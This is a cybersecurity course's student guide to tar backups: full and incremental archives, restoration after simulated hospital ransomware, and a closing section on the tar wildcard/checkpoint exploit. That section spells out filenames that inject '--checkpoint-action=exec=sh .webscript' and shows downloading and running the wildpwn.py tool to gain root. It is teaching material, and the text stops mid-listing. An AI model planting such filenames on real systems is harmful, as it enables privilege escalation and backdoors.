## 5.1 Student Guide: Backups and Restoring Data with `tar`

### Overview

The goal of this unit on Archiving and Logging Data is to learn how system administrators use Linux tools to **archive** data so it remains available in case of a natural disaster or cyber attack; **schedule** data to ensure that backups are made hourly, daily, or monthly; and **monitor** log files to prevent and detect suspicious activity and keep systems running efficiently.

We will by covering the Linux `tar` utility. Today's class focuses on how to use backup and recovery to protect data integrity and availability.  You will use `tar` to list and extract data, and create backups. You'll use this to guarantee availability and integrity by archiving users' data and system configuration files.


### Class Objectives

By the end of today's class, you will be able to: 

* Identify and describe use cases for the three kinds of backups.

* Create (tar) an archive from existing files and directories.

* List and search the contents of an existing archive.

* Extract (untar) the contents of an archive.

* Describe and demonstrate two exploits for the `tar` command.

### 01. Welcome and Overview  

Welcome to the second week of Linux. In the previous unit, we learned about system configuration, file structures, and hardening against attacks. 

In this unit, we will continue to explore how system administrators use Linux tools to secure a system by: 

- **Archiving** data to ensure it remains availabile in case of a natural disaster or cyber attack.

- **Scheduling** backups to ensure they are up to date and made either hourly, daily, or monthly.

- **Monitoring** log files to prevent and detect suspicious activity and keep systems running efficiently.

These skills are relevant for the following day-to-day system administrators tasks:

- Overseeing or conducting backup and recovery tasks.

- Determining how long to retain (keep) data and the frequency (how often) it is backed up.

- Monitoring and troubleshooting backups and restore issues.

- Providing security for compliance requirements.

#### Today: Archiving with `tar`

Today’s lesson will focus on creating and managing archives using the `tar` utility. 

- You should understand how the topics in today's lesson are essential to promoting the availability of a system and data.

_Backups_ and _data archiving_ are important to maintain compliance with regulations for IT security in industries such as finance and health:

- In finance, the common standard for data archiving is the **Sarbanes-Oxley Act** (SOX), which requires all business records and communication to be retained for five years.  

- The **Markets in Financial Instruments Directive** (MiFID II) requires the European Union's financial firms to retain and reproduce records of all activity from telephone conversations and electronic communications, including instant messages and social media interactions.

* In health, the most common standard is  **Health Insurance Portability and Accountability Act** (HIPAA), which requires healthcare providers to keep records for six years.

*Note:* For additional information on the above laws:

* [Sarbanes-Oxley Act (SOX)](<https://www.mythics.com/about/blog/sarbanes-oxley-act-sox-compliance-requirements-for-it-security>)
* [Health Insurance Portability and Accountability Act (HIPPA)](<https://linfordco.com/blog/hipaas-record-retention-requirements/>)
*  [Markets in Financial Instruments Directive 2004/39/EC (MiFID II)](<https://www.mirrorweb.com/mifid-ii-compliance>)


### 02. An Introduction to using the `tar` Command 

Cybersecurity professionals must ensure that data is always protected against threats of data loss and interruptions caused by attacks or natural disasters. 

The following are examples of data loss:

- In 2019, hackers seized important government machines in [Baltimore, Maryland](<https://www.nytimes.com/2019/05/22/us/baltimore-ransomware.html>) during a ransomware attack.

- In 2019, Hurricane Michael caused massive flooding, destroying hundreds of homes, businesses, and strategic defense data at [Tyndall Air Force Base](<https://www.washingtonpost.com/national/hurricane-michael-tyndall-air-force-base-was-in-the-eye-of-the-storm-and-almost-every-structure-was-damaged/2018/10/23/26eca0b0-d6cb-11e8-aeb7-ddcad4a0a54e_story.html?utm_term=.9182d43bfb6f>).

System administrators **back up** data so that government facilities and businesses are able to quickly recover any lost data and get systems up and running quickly.

- A **backup** is a **saved version** of all the files in a hard drive at a given point in time. 

- Think of it as saving every single file on your system, and copying it to a safe place, so if you lose any files on your system you can always get them back.

- Backups are generally done hourly or daily. This ensures that when an attack happens, data can be restored as close to the time of the incident as possible, resulting in little loss of data.

- Performing regular server backups should be one of a system administrator's top priorities.

In addition to a full backup, which saves every file on a hard drive, administrators can also create backups of individual files and folders. This is useful when you don't need to save every file on the hard drive is important. 

- For example, an admin may create a backup containing only the `/home` directory, ensuring that users will always have access to their data, even if the rest of the machine is compromised.

There are different types of backups, known as backup **levels**: full, incremental, and differential.


A **full backup** creates a backup of the entire system. 

- You would create a full backup if, for instance, you recently got a new computer for work and want to do an initial backup.

- Full backups allow for a more reliable restoration of a system. They also provide better storage management, as all the files are in one place.

- However, full backups are slow and require a large storage space capable of storing the entire system. 

In addition to a full backup, administrators can create **backups of individual files and folders**. 

- For example, an admin may create a backup containing only the `/home` directory, thus ensuring that users will always have access to their data, even if the rest of the machine is compromised.

-  **Incremental** and **differential** backups archive *only data that has changed* since the last full backup. They are fast and take up less disk space, but you'll need all backups in order to restore the full data.    

Why backup levels are important:

* When a system is compromised, users may have to delete the entire operating system and install it from scratch. This is time-consuming and costly for enterprise-level networks.

* Instead of deleting and reinstalling the whole OS, the backup level allows the user to "rewind time" and restore their computer to exactly the same state it was in before being corrupted.

#### Performing a Backup 

Now that we understand the importance of backups, we’ll discuss how to actually perform one.     

The `tar` command is a Linux utility that system administrators use to create a backup.

- `tar` stands for _tape archive_. 

- `tar` will create an **archive** of the files we want to back up.

Note the following about archives:

- An archive is a collection of files and directories.

- A backup is an archive used specifically to preserve information in the event of data loss.

- Archives created with `tar` are called **tarballs** and use the extension `.tar`.

- The file size of a tarball, in bytes, is equal to the sum of the file sizes of each of the files it contains. This is important, because it means that each and every `tar` backup of a hard drive takes up the same amount of space as all the files on the drive.

 **Compression** is a technique that transforms files into a format that takes up less space. A compressed tarball takes up less space than all of the files on disk.

* There are many different ways to compress a file. The most common for systems administrators are `gzip` and `bzip2`.

* `gzip` is the accepted standard for compression on Unix-like systems. `bzip2` offers better compression, but is much slower than `gzip`.

* Both `gzip` and `bzip2` are commands that can be used to compress any file, but `tar` has built-in flags that allow you to compress tarballs immediately.

* Tarballs that have been gzipped have the extension `tgz` or `tar.gz`, and the extension `bz2` if they've been bzipped.

#### Creating an Archive

Next, we'll cover how to “create” an archive.    

The Systems Operations Center at [Tyndall Air Force Base](<https://www.washingtonpost.com/national/hurricane-michael-tyndall-air-force-base-was-in-the-eye-of-the-storm-and-almost-every-structure-was-damaged/2018/10/23/26eca0b0-d6cb-11e8-aeb7-ddcad4a0a54e_story.html?utm_term=.9182d43bfb6f>) likely backed up all system data with the approaching threat of Hurricane Michael.

They would create a full backup of all the log files in `/var/log` directory using the `tar` command as follows:


- `tar cvf hurricane-backup-10-11-2018.tar /var/log`

    Syntax breakdown: 

    `tar [option(s)] [archive_name] [objects_to_archive]`

    - `tar` is the Linux command. We will always begin our backups with `tar`. 
    - `c` , `v`, and `f` are [_short_](<http://linuxcommand.org/lc3_man_pages/tar1.html>) form options.
    - `c` stands for create. We will always need this option when creating an archive.
    - `v` stands for [_verbose_](<https://www.gnu.org/software/tar/manual/html_node/verbose-tutorial.html>). While not necessary to used when creating an archive, this option shows details about the results of running the `tar` command.  
        - It is a best practice to use this option to validate for errors. For example, that the file *permissions* and file *sizes* and file *dates* are archived properly. 
    - `f` stands for [_use this archive file_](<https://www.gnu.org/software/tar/manual/html_node/file-tutorial.html#SEC14>). It is followed by the title of the archive. It also be written as `--file=archive_name`.  This option must be present whem creating an archive.
    - `hurricane-backup-10-11-2018.tar` is the `archive_name` and indicates the title given to our archive. Note the `.tar` file extension. 
    - `var/log` are the _objects to archive_, indicating the files or directories we want to back up.

Run the command:

- `tar cf 2018-10-12-hurricane-backup.tar /var/log`

The files in the archive are not displayed to the same terminal screen in which the command is run. This would not be a good practice, since we cannot tell what was archived. Therefore, we will have to print this information. 

`tar` has two options that will print information about which files were archived:
       
* `v`, which prints the name of every file archived.
  
* `vv`, which prints the full listing for each file, including the name, file permissions, owner, etc.

If `tar` does not receive files or directories to archive, it outputs the following error message:

```
tar: Cowardly refusing to create an empty archive
Try 'tar --help' or 'tar --usage' for more information
```

Next, run this command with the `v` option and see the following output.

- `tar cvf 2018-10-12-hurricane-backup.tar /var/log`

    ```
    /var/log/fontconfig.log
    /var/log/kern.log.2.gz
    /var/log/wtmp
    /var/log/vboxadd-install.log
    ...
    ...
    ```
    

This command _shows the files_ that are being written to the archive as the command runs. However, it does not display a _full listing_.

Run the command using the `vv` option and see the following output:

- `tar cvvf 2018-10-12-hurricane-backup.tar /var/log`
  
    ```
    -rw-r--r--  root/root      5784  2019-07-03  15:38   /var/log/fontconfig.log
    -rw-r-----  syslog/adm   141571  2019-07-1-  11:16   /var/log/kern.log.2.gz
    -rw-rw-r--  root/utmp     20352  2019-07-15  15:33   /var/log/wtmp
    -rw-r--r--  root/root       695  2019-07-05  21:09   /var/log/vboxadd-install.log
    ```

This information is very important in determining what archive to use when restoring data after an attack.

The output of the `tar` command can also be written to a file for later review.  

- How this would be accomplished?

    - `>`  will redirect output to a file.

Some of the best practices for maintaining [security](<https://www.gnu.org/software/tar/manual/html_section/tar_84.html#SEC176>), privacy, and integrity when creating an archive:

- Be sure archives are not writable by an untrusted user.

- Inspect all data, such as passwords, before writing to an archive, since this data will be copied to the archive. 

- Monitor backups—`tar` is vulnerable to denial of service (DoS) attacks, which can be triggered if an attacker creates an infinitely deep directory hierarchy.

- Pay attention to the diagnostic and exit status of `tar`.

### 05. Restoring Data with `tar` 

We've covered how to use `tar` to create full backups. Now, we'll look at how to use a full backup to restore data.

Consider a scenario in which your laptop is stolen.  

- After buying a replacement laptop, you want to put all the files that were on your first laptop onto your new one. 

- Fortunately, you had a full backup of all your files on an external hard drive, so you can access everything that was lost.

Restoring data from a backup will usually include the following steps: 

- Listing the contents of your backup to ensure that it has the data you want to restore.

- Extracting the files, which will copy and restore them to disk. 

To use the `tar` command to put all the files in the full backup on your new laptop: 
    
- `tar xvvf my_laptop_backup.tar`

    Syntax breakdown: 

    - `x` means _extract_ the files from the archive and write to disk.
    - `vv` displays a full file specification.
    - `f` specifies the archive file to use.
    - `my_laptop_backup.tar` is the archive that contains the files from your laptop.

The command used to extract files from an archive is almost identical to the command used to create one. The only difference is the replacement of **`c`** with **`x`**.    

After running this command, all of your emails, documents, pictures, movies (_every_ file)  contained in `my_laptop_backup.tar` will be extracted from the archive and saved to the new laptop's hard drive. This process is called **backup restoration**.    

Before extracting, you would first list the contents of the archive to ensure it has the data you want.

- Listing files in an archive does _not_ restore the data. The contents of the archive are only displayed on a terminal screen.

- Extraction _copies_ and _restores_ the files to disk.

We don't always need to restore the full contents of a backup. In those cases, we use `tar` to first list the contents of our backup, and then we can extract only the specific data we need. 

#### Medical Center Scenario

Now, we will cover how to use this method of storing files to protect organizations from modern attacks. 

Medical centers and hospitals are large targets for cybercriminals. In 2019 [Hackensack Meridian Health's systems](https://www.app.com/story/news/health/2019/12/13/hackensack-meridian-ransom-hackers-cyber-attack-hospitals/2638701001/) were compromised by a ransomware attack. Attackers encrypted medical data of many patients in the hospital. 

- The attackers offered to decrypt the data in exchange for payment, effectively ransoming the government's data. Unfortunately, in the case of Hackensack, the hospital had to pay. 

In the following demonstration, we are going to do what the hospital should have done in preparation for potential cyber attacks. 


For this demonstration, we'll respond to a ransomware attack that hit a hospital on the morning of May 11 2019. Among the affected systems were:

- Doctors
- Patients
- Treatments
- Files

After taking the infected systems offline, we'll need to:   

- Restore the operating system and applications using the full backup.
- Restore email data using the full backup.

To restore the email data, the SysOps team will use the `tar` command to:

- _List_ the contents of the latest full backup to locate the email data. 
- _Extract_ the email data from the archive to a directory on the new system.

#### Hospital Walkthrough

Open a terminal window. We'll now look at the directory that contains the `tar` file of the hospital's latest full backup.

- Run `cd treatments/backup/`

- Run `ls -l 10May2019-235536-0700.tar`

The date and time on the archive indicate that this backup was created the night before the attack.

Run the following command to list the files in the archive and see the output below:

    tar tvvf 10May2019-135536-0700.tar | less
    
    drwxr-xr-x root/root         0 2019-05-09 17:29 16:29 backups/
    drwxr-xr-x root/root         0 2019-05-09 17:29 backups/neurology/
    -rwxr-xr-x root/root      9465 2019-05-09 17:29 backups/neurology/treatments.18.csv
    -rwxr-xr-x root/root      9761 2019-05-09 17:29 backups/neurology/treatments.16.csv        
    ...
    ...
    drwxr-xr-x root/root         0 2019-05-09 17:29 backups/oncology/
    -rwxr-xr-x root/root      9354 2019-05-09 17:29 backups/oncology/treatments.12.csv
    -rwxr-xr-x root/root      9070 2019-05-09 17:29 backups/oncology/treatments.8.csv
    ...
    ...
    drwxr-xr-x root/root         0 2019-05-09 17:29 backups/cardiology/
    -rwxr-xr-x root/root      9477 2019-05-09 17:29 backups/cardiology/treatments.5.csv
    -rwxr-xr-x root/root      9952 2019-05-09 17:29 backups/cardiology/treatments.7.csv
    ...
    ...

Syntax breakdown:

- `t` is an option that lists the contents of an archive.
- `vv` is used to display the full file specification.
- `f` is used to specify the archive file to use.
- `10May2019-235536-0700.tar` is the archive name.
- `| less` means we will pipe the output of the command in pages to the terminal screen. The command displays the file permissions, size, and date/time information. 

If `tar` cannot find the archive or file to list, it will output the following message:

```
tar: <archive>: Not found
tar: Exiting with failure due to previous errors
```

Next, we will extract the email files from the archive and place them in a new directory.  

First we need to create a new directory to hold the restored email files. 

- Run `mkdir restored_emails` 

Now we'll extract the email files from the archive:

- Run:  `tar xvvf 10May2019-235536-0700.tar -C restored_emails --wildcards "*.csv"`   

Syntax breakdown: 

* `x` means to extract and write the files to disk.
* `vv` is used to display the full file specification. 
* `f` is used to specify the archive file to use.
* `10May2019-235536-0700.tar` is the archive file.
* `-C restored_emails` is the name of the directory where the `.csv` files will be placed.
* `--wildcards "*.csv"`is used to only extract the files with the extension **`.csv`**. 


Run the following command to show the restored emails:

- `ls -l restored_emails/backup/neurology/`

The original directory structure (`backup/neurology`) is retained in the archive and now can be seen on disk.  

* Extracting files from a tar archive should be done with caution and that testing with the `t` option should be done first.

* Note the following:
  
    * Files archived with leading (`/`) slash will be *restored to their absolute locations*.
    
    * Files that were archived without leading (`/`) slashes will be restored *under the current directory*.

    * Files extracted from an untrusted archive should be extracted into an *empty directory*.

### 08. Incremental Backups with `tar` 

So far, we've been creating _full backups_. 

While full backups ensure the availability and integrity of a system, there are some drawbacks to using them.

* The file sizes for full backups are very large, because they include everything on a system.

* Depending on the size of the file system, doing a full backup takes a very long time. 

This is where **incremental backups** are helpful.

* Incremental backups are done after a full backup has been performed on a system.

* Incremental backups capture only what has changed since the last incremental backup. This makes incremental backups smaller than full backups.

Incremental backups store in a snapshot file a list of which files have changed.

* The snapshot file is created when the administrator creates the initial level 0 incremental backup. Every time an incremental backup is done, a new snapshot file is created. 

* This snapshot file contains a record of what the system looks like at the moment in time it is created.

* Consider the frequency of incremental backups (e.g., hourly or daily). Making incremental backups hourly ensures that each backup is small and restores (relatively) quickly, with minimum loss of data after an attack.

There are tradeoffs to using incremental backups:

* Restoring is slower because you must restore the latest full backup, and then all the incrementals. 

* The SysOps team usually schedules incremental backups frequently, so the restore time is faster.
  
* There may be loss of data if one of the backups is corrupted. For example, if we cannot read the backup done at a certain time or on a certain day.

* This is why it's so important to verify an archive is created with no errors by using the `tar` `W` option.

#### Creating the Incremental Backup 

Note the following about using `tar` to create incremental backups:

* An [incremental backup](<https://www.gnu.org/software/tar/manual/html_node/Incremental-Dumps.html>) is a special form of a `tar` archive.  
  
* `tar` stores additional metadata or information so that the exact state of the file system can be restored when extracting the archive.

* The additional information includes which files have been changed, added, or deleted since the last backup, so that the next incremental backup will contain _only modified_ files.

* The additional information is stored in a snapshot file.

     * Snapshot files have the extension .`snar`, which stands for *sn*apshot + t*ar*.

        * For example: `emerg_backup.snar`
     
     * The snapshot file in the current version of `tar` is a binary file and is not human-readable.  [Read more about the format of snapshot files](<https://www.gnu.org/software/tar/manual/html_node/Snapshot-Files.html>).


Next, we will create an incremental backup with the `tar` command.       
    
- Type the following command and note that this requires two new flags in addition to the ones you are already familiar with:

    - `$ tar cvvWf emerg_back_sun.tar --listed-incremental=emerg_backup.snar --level=0 emergency`

Syntax breakdown:

* `--listed-incremental=emerg_backup.snar`: This option tells `tar` that this backup will be part of a series of incremental backups, and specifies that information about files added, changed, or removed should be stored in a snapshot file called `emerg_backup.snar`.

* `--level=0`: This option tells `tar` that this backup will be the very first backup in the series—in other words, this is the full backup and starting point that will be used as the basis for all later incremental backups.

Because this is the first backup in the series, this is both a full backup and an incremental backup. This is because the first backup in a series of incrementals is necessarily a full or **level 0** backup. 
- Every succeeding backup will be much smaller than this one.

- When this backup is created, the snapshot file will simply contain `Y` for every file in the archive.

This command spells out the option and has a `--` before it.  This is called the [long form](<http://linuxcommand.org/lc3_man_pages/tar1.html>). Incremental commands typically use this syntax.
    
#### Incremental Backups Demo Setup

Use the following scenario as the basis for proceeding demonstration of incremental backups:

* A hospital's system operations staff performs a full backup of all the data in the emergency database on Sunday. 

* On Monday, the staff runs an incremental backup which stores all changes made on Monday. This backup is smaller than the full backup.

* On Tuesday, an incremental backup archives only the changes made on Tuesday to the emergency database.

* The hospital is hit with a ransomware attack on Wednesday and all the data in the emergency database is encrypted.

* Fortunately, since the hospital created full and incremental backups, the files in the emergency database are easy to restore.
  

You'll use the `tar` command to complete the following steps: 

* _Create_ a full or level 0 backup of the emergency directory and a snapshot file.

* _Display_ the contents of the level 0 backup that would have been created on Sunday.

* _Create_ the incremental backups that would have been generated on Monday and Tuesday.

* _Remove_ the emergency directory to mimic the ransomware attack on Wednesday.

* Finally, _restore_ the emergency directory by first restoring the full backup taken on Sunday, restoring the incremental backup taken on Monday, and restoring the second incremental backup taken on Tuesday.  

#### Incremental Back Up Demo

We'll start in our `$HOME` folder. We'll list the contents of the simulated emergency directory for the hospital.  Two directories are located there: `admit` and `discharge`.

- Run `ls -l emergency`
    ```
    drwxr-xr-x  2   instructor  instructor  4096    Jul 4   03:28   admit
    drwxr-xr-x  2   instructor  instructor  4096    Jul 3   22:34   discharge
    ```

Next, we'll list the contents of the `admit` and `discharge` directories and show the output.

- Run ` ls -l admit discharge`
  
    ```
     ls -l admit discharge

        admit:
        total 16
        -rw-r--r--  1   instructor  instructor  20  Jul 3   22:34   file1
        -rw-r--r--  1   instructor  instructor   9  Jul 4   02:55   file3
        -rw-r--r--  1   instructor  instructor  13  Jul 4   03:26   file4
        -rw-r--r--  1   instructor  instructor  13  Jul 3   03:28   file5
        
	discharge:
        total 4
        -rw-r--r--  1   instructor  instructor  19  Jul 3   22:34   file2
    ```
    

Again, the syntax for the command is: 

- `tar [options] [archive_name] --incremental=[snapshot file name] --level=0 [objects_to_archive]`  

We will now run  the following command to simulate the level 0 backup on Sunday.  
    
- Run: `tar cvvWf emerg_back_sun.tar --listed-incremental=emerg_backup.snar --level=0 emergency`
  

This command will create the following:

- A level 0 or full backup in the file `emerg_back_sun.tar`.
  
- A snapshot file called `emerg_backup.snar` that will be used to store the additional information such as which files have been changed, added, or deleted.  This file is in binary format and is not human-readable.

- `tar` indicates this by appending data to the file as follows:

    - `Y` indicates that the file is contained in the archive.

    - `N` indicates that the file was present in the directory at the time the archive was made, yet it was not added to the archive because it has not changed since the last backup.

    - `D` indicates the file is a directory.  

Other options we have used so far: 

- `c` creates an archive.

- `vv` displays a full file specification.

- `W` verifies the archive after creating it. You used this option when creating a full backup. It should _always_ be used.

- `f` stands for _use this archive file_.  This option must be present.

- `emerg_back_sun.tar` is the archive filename.  This is the full backup that is completed every Sunday.

-  `emergency` is the directory we want to backup.

Next, we will show the files that were created from the command.   

- Run the `ls command` on the `epscript` directory:

    `ls -l epscript`

The output:

```
emerg_back_sun.tar - this is the `full` or `level 0` backup file

emerg_backup.snar - this is the `snapshot` file
```


As a best practice, after creating the snapshot file, system administrators will use the `tar list` command to check the files that are in the `emerg_back_sun.tar` file. 

- Run the following commands: 

     `cd epscript`  
     `tar tvvf emerg_back_sun.tar --incremental`

     Output should look like:

    ```

    ```

- For each directory in the `emerg_back_sun.tar` file, this command will list the files in the directory at the time the archive was created for (as indicated by the `t` option).

    Syntax breakdown: 

    - `t` lists the files from the archive to the terminal screen.
    - `vv` displays a full file specification.
    - `f` stands for _use this archive file_.  This option must be present.
    - `emerg_back_sun.tar` is the archive to use.
    - `--incremental` indicates that this is an incremental backup.

Using the `--incremental` option will display one of the following next to each file:

- `Y` indicates that the file is contained in the `emerg_back_sun.tar` archive.

- `N` indicates that the file was present in the directory at the time the archive was made, but was not added to the `emerg_back_sun.tar` archive because it has not changed since the last backup.

- `D` indicates the file is a directory.

Now we will simulate the Monday and Tuesday incremental backups that were run by the system admin team.

- First, we will simulate the addition of a new file to the `admit` directory. This change was made on Monday, the day after the level 0 backup was created. 

- Run the command to add a new file in the `emergency/admit` directory:

     `echo "New file for CJones" > emergency/admit/file6`

- Run the commands to _create_ the Monday incremental backup, _list_ the contents, and _show_ the output from the command with the added file.
  
   ` tar cvvWf emerg_back_mon.tar --listed-incremental=emerg_backup.snar emergency`

    `tar tvvf emerg_back_mon.tar --incremental`
```
    drwxr-xr-x  instructor/instructor   29  2019-07-04  03:28   emergency/admit/

    N file1
    N file3
    N file4
    N file5
    Y file6       
```

Note the following:

- `--level=0` option is not used in the command. `tar` sees this as an incremental backup, not a full backup, because a snapshot file has already been created.

- Only `file6` was added to the Monday `emerg_back_mon.tar` file. This keeps the `tar` file very small.

Next, we will simulate the updating of an existing file in the `discharge` directory. This change was made on Tuesday. 

- Run: 

    `echo "Update MSmith" >> emergency/discharge/file2`

    `tar cvvWf emerg_back_tues.tar --listed-incremental=emerg_backup.snar emergency`

    `tar tvvf emerg_back_tues.tar --incremental`

    Output should look like:
```
    drwxr-xr-x root/root        19 2019-12-28 17:46 emergency/discharge/
    Y file2
    N file2.txt
```

- Only the updated file is added to the `emerg_back_tues.tar` file.

 Review the incremental files that have been created in the `$HOME` directory.

* Run `ls -l *.tar`
  
* The output from this command shows the files that were created:

```
    emerg_back_sun.tar
    emerg_back_mon.tar
    emerg_back_tues.tar
```

We will now simulate Wednesday's ransomware attack on the hospital by removing the `emergency` directory.  

- Run the following commands: 

    `rm -r emergency`  
    `ls` 

We can restore the directory by first extracting the files from the full backup from Sunday, followed by the incremental backups from Monday and Tuesday.

- The following `tar` command extracts the files from the archives:

    `tar xvvf emerg_back_sun.tar --incremental`

    - Syntax breakdown: 
    
        - `x` extracts the files from the archive.
        - `vv` displays a full file specification.
        - `f` stands for _use this archive file_.  This option must be present.
        - `emerg_back_sun.tar` is the archive to use.
        - `--incremental` indicates that this is an incremental backup.

    - The snapshot file is not needed in the command since all the metadata, or, information necessary for extraction, is stored in the archive.

In our `$HOME` directory, we run the following commands to restore the `emergency` directory:

- First, apply the Sunday level 0 backup.

    - Run `tar xvvf emerg_back_sun.tar --incremental`

- What files are in the emergency directory now? 

    - The directory contains only the original files in the `admit` and `discharge` directories.

- Run the `ls` command to display the current files in the `emergency` directory:

    `ls -R emergency`

- We'll now apply Monday's incremental backup.

    - Run `tar xvvf emerg_back_mon.tar --incremental`

- What files are in the `emergency` directory now?

    - The directory now also contains the `file6` file we added on Monday. 

        - Run `ls -R emergency` to confirm. 

- We'll show the `emergency/discharge/file2` file before applying the Tuesday incremental backup, so that we can see the state of the file before we update with Tuesday's file.  

- Run `cat emergency/discharge/file2`

Next, we'll apply Tuesday's incremental backup.

- Run `tar xvvf emerg_back_tues.tar --incremental`

What is the state of the file now?

 - The `file2` file contains the line we added for the Tuesday incremental backup.

We have restored the files in the `emergency` directory to the state before the malware attack.

### 12. Exploiting the `tar` Command with the Checkpoint and Wildcard Options 


In the previous sections, we learned how `tar` can be used to create full and incremental backups, and how we can extract files and directories from these backups.

In this last section, we’ll look at how the `tar` command can be used by hackers to plant malware on a system. 

- This involves a combination of using the wildcard character and a feature known as _checkpoints_ with `tar`. 

- Using the wildcard character specifies all the files in a directory without having to type each filename.

- Wildcard characters in shell commands are expanded to matching filenames before a command is actually executed.

We’ll first look at how wildcards are used with `tar`. 

#### Using Wildcards with `tar`

We've used the wildcard character `*` before when creating an archive.

- Rather than typing out each specific file that needs to be included in a full backup, sysadmins will use the wildcard option to indicate that they want to back up an entire directory. 

- While using the wildcard is not necessary, it is common practice among system administrators.

For example, if we have a directory called `Documents` that contains the nine files listed below, we can run the following command to create an archive that contains all of them, without having to type the name of each individual file.

     cd /Documents/ExploitTar
     ls .
        f1 
        f2
        f3
        f4
        f5
        f6
        f7
        f8
        f9
        f10
     tar cvf archive.tar ./*

This is important to understand when exploiting `tar` and will tie into the next topic we cover.

#### Checkpoints

- A checkpoint is an action assigned to take place at a specific stage of a backup or restoration. 

- The actions and their frequency (the point at which the action is taken) will vary based on the circumstance. Typically, the frequency relies on reaching *n* number of files in a backup or restoration.  

- Two examples of checkpoints: 

    - A checkpoint is scheduled to run once the backup reaches 1000 files. At this point, the checkpoint triggers the backup to pause and output a message to the terminal that displays the amount of remaining disk space. 
    
    - When restoring files from a remote site, a message will print the number of bytes transferred every 5000 files. 

- Including checkpoints in our backup and restoration process is a best practice because it allows administrators to avoid serious issues, such as accidentally using up all of the space on the backup server, or slowing down the network—both of which can damage data availability. 

When using checkpoints, we use two checkpoint commands. The first command indicates when the action will occur. The second command indicates what the action is. 


Use the following example to detail the syntax of the checkpoint command: 

 `--checkpoint=1000` and  `--checkpoint-action=du`
    
- `--checkpoint=1000` indicates how often the checkpoint occurs. At every thousandth file, an action will take place. 

- `--checkpoint-action=du` indicates the action that will take place. `du` indicates that the action is to display how much disk space is left on the machine.

The general syntax of checkpoint commands is: 

 `--checkpoint=[n]` and `--checkpoint-action=[ACTION]`

Next, we'll look at the general process a hacker uses to exploit a system vulnerability: 

- In our previous Linux unit, we learned how system administrators must harden a system against attacks. 

- Once hackers find a weakness in a system, they find ways to exploit it by changing existing code or uploading and  running their own code, also known as **arbitrary command execution**, or **ACE**. 

- ACE vulnerabilities are extremely dangerous, because attackers can exploit them to accomplish almost anything. In particular, hackers often use them to achieve their primary goal of gaining root privileges on a system, which allows them to completely compromise the machine.

- For our current example, hackers have discovered how to use the `tar` checkpoint option with a wildcard to plant malicious code on a system, which they can later run to gain full root privileges on the machine.

### Using Checkpoints and Wildcards to Exploit a System

Hackers can exploit `tar` using the following steps: 

- A hacker will gain access to the system by impersonating a normal user. This can happen if a hacker is, for example, able to get that user’s password. 

    - A normal user cannot access sensitive files, open network connections, or perform other actions that require root privileges. 

    - But a normal user should typically be able to download and execute files from the internet.

    - A hacker can exploit this by downloading malicious files, which the hacker can execute to compromise the system. 

- Today, we’ll see how hackers can use `wildpwn.py`, a Python file they can simply download from the web, to exploit `tar` and gain root privileges. 

    - Downloading and running `wildpwn.py` will plant malicious files in that normal user’s home directory. 

    - Specifically, `wildpwn.py` will plant three malicious files on the system: one hidden malicious script, and two other files that are named so that they look like `tar` checkpoint commands. 

- When an unsuspecting administrator—who often have root privileges—runs the `tar` command with the wildcard option to create an archive containing this directory, `tar` will execute this malicious script. 

    - The script, in turn, will use the administrator’s root privileges to create malware on the system. 

    - The hacker will later be able to use this malware to drop into a root shell, granting them full root access to the system. 

It's okay if you're a little confused at this point. We’ll next dive into the specifics of `wildpwn.py` to clarify the details of this exploitation. 

- When a hacker runs `wildpwn.py`, it creates three files. The hacker is able to create these files even if they only have normal user privileges. The files that are created are a malicious hidden script called `.webscript` and two files whose names appear like checkpoint commands. 

- The checkpoint files will look like this: 
  
    - `--checkpoint=1`
    
    - `--checkpoint-action=exec=sh .webscript`

- `--checkpoint=1` tells `tar` to execute the checkpoint action after adding the first file to the archive. In other words, these checkpoint files will cause `tar` to execute the malicious `.webscript` almost immediately.

- When an unsuspecting sysadmin runs `tar`, the system will mistakenly interpret the above filenames as checkpoint commands, and the checkpoint commands will cause `tar` to execute `.webscript`.

- If an administrator runs this command with root privileges, the malicious `.webscript` will run with root privileges as well — meaning it can do anything to the system!

- When `.webscript` is run with root privileges, it creates a malicious program that the hacker can use to open a root shell. It then creates a hidden directory, called `.cache`, and saves the malware to a hidden file in this directory, called `.cachefile`.

- Leaving the final malware in a hidden directory called `.cache`, within a hidden file called `.cachefile`, is a very subtle and stealthy deployment method. The administrator will have no idea that the file has been created, and will not see either the `.cache` directory or the `.cachefile` unless they list all files with the `-a` flag.

The hacker cannot simply run `.webscript` on their own, because they don’t have root privileges. They must wait for the system administrator to run it in order to later impersonate them.


#### Exploiting `tar` Demo

We'll use the following scenario: 

- A hacker has gained access to our system by stealing the password for the instructor user. 

- Although for this example we will pretend that instructor user does not have root access, in your activity you will truly be working on a user without root access. 

- We will be taking the role of the hacker and will use `wildpwn.py` to plant malicious files. These files will be executed when an administrator with root privileges runs the tar command. 

Open up a terminal and run the following commands:

- Create a new directory for this demonstration: `mkdir Documents/exploit_demo`

- Move to the `exploit_demo` directory: `cd /home/instructor/Documents/exploit_demo`

    - This is the directory to which the hacker would download the `wildpwn.py` program. 

Download the script with `wget`. 

- Then, run `ls -l` to show that the `wildpwn.py` program is in this directory. 

    ```
     wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py
     ls -l
     -rw-r--r--   1 instructor  instructor   3.6K Dec 19 12:46 wildpwn.py
    ```

Type  `python wildpwn.py tar .` This will create both the malicious script and checkpoint files.

- Syntax breakdown:

    - `python` is used to run Python programs.
    - `wildpwn.py` is the program we’re executing.
    - `tar` tells `wildpwn.py` to create malicious files that will exploit the `tar` command. This is necessary because `wildpwn.py` can exploit other commands as well.
    - The `.` specifies that these files should be created in the current directory.

- Run the command and show the output:

    - `python wildpwn.py tar .`
    ```  
    [!] selected payload tar
        
    [*] Done! Now wait for something like: archive.tar * on . Good Luck!
    ```
- The script is now listening for someone to use the tar command. Let's archive this directory to activate the script.

Move into `exploit_demo`: `cd ~/Documents/exploit_demo`.

Now, use `tar` with a wildcard to create an archive and generate the malicious files: `sudo tar cf archive.tar *`

- Note that this command is run from _inside_ the directory where `.webscript` is located. If it were run elsewhere, the backdoor would not be generated.

- Getting this exploit to work obviously requires that the sysadmin create the archive from the same folder where `.webscript` lives. Common targets that are often archived in this way include `/tmp`, users' `~` directories, users' `Documents` directories.
Next, we’ll list the contents of our directory to show that our hidden malicious program and checkpoint files have been created. 

- Run: `ls -la`
    ```
    drwxr-xr-x 3 instructor instructor 4096 Dec 28 18:41  .
    drwxr-xr-x 3 instructor instructor 4096 Dec 20 13:05  ..
    drwxr-xr-x 2 instructor instructor 4096 Dec 28 18:40  .cache
